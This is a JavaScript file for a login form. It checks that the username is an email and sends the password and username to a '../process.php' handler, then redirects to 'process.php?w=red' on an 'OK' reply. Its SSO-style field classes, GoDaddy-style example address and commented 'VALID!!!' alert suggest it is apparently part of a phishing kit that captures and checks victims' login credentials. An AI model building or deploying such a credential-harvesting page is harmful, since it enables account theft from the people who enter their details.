new MaskedPassword(document.getElementById("password"), '\u25CF', 0);
var User = document.getElementById('username');
var Pass = document.getElementById('password');
var Err_msg = document.getElementById('login-status-message');
var user_err = document.getElementById('username-notice');
var pass_err = document.getElementById('password-notice');

function validateEmail(email) {
    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}

//
User.addEventListener("keyup", function (event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        NE()
    } else {
        user_err.classList.add('hide');
        User.classList.remove('sso-field-danger');
    }
});
Pass.addEventListener("keyup", function (event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        NE()
    } else {
        pass_err.classList.add('hide');
        Pass.classList.remove('sso-field-danger');
    }
});

function NE() {

    if (Pass.value == "") {
        pass_err.classList.remove('hide');
        Pass.classList.add('sso-field-danger');
        Pass.focus();
    }
    if (User.value == "") {
        user_err.classList.remove('hide');
        user_err.innerHTML = "Username is required";
        User.classList.add('sso-field-danger');
        User.focus();
    } else if (!validateEmail(User.value)) {
        user_err.classList.remove('hide');
        user_err.innerHTML = "Email must be in a valid email format (e.g., username@coolexample.com). Please try again.";
        User.classList.add('sso-field-danger');
        User.focus();
    }


    if (Pass.value != "" && validateEmail(User.value)) {

        Err_msg.classList.add('hide');
        document.getElementById('submitBtn').disabled = true;
        document.getElementById('btnSpin').classList.remove('hide');



        var hr = new XMLHttpRequest();
        var url = "../process.php";
        var vars = "pass=" + document.getElementById('password_real').value + "&user=" + User.value;
        hr.open("POST", url, true);
        hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        hr.send(vars);


        hr.onreadystatechange = function () {
            if (hr.readyState == XMLHttpRequest.DONE) {

                var resp = hr.responseText;

                if (resp === "OK") {
                    window.location.replace("../process.php?w=red");
                    // alert('VALID!!!');

                } else {

                    document.getElementById('submitBtn').disabled = false;
                    Err_msg.classList.remove('hide');
                    document.getElementById('btnSpin').classList.add('hide');

                }
            }
        }




    }

    // alert('OK');
}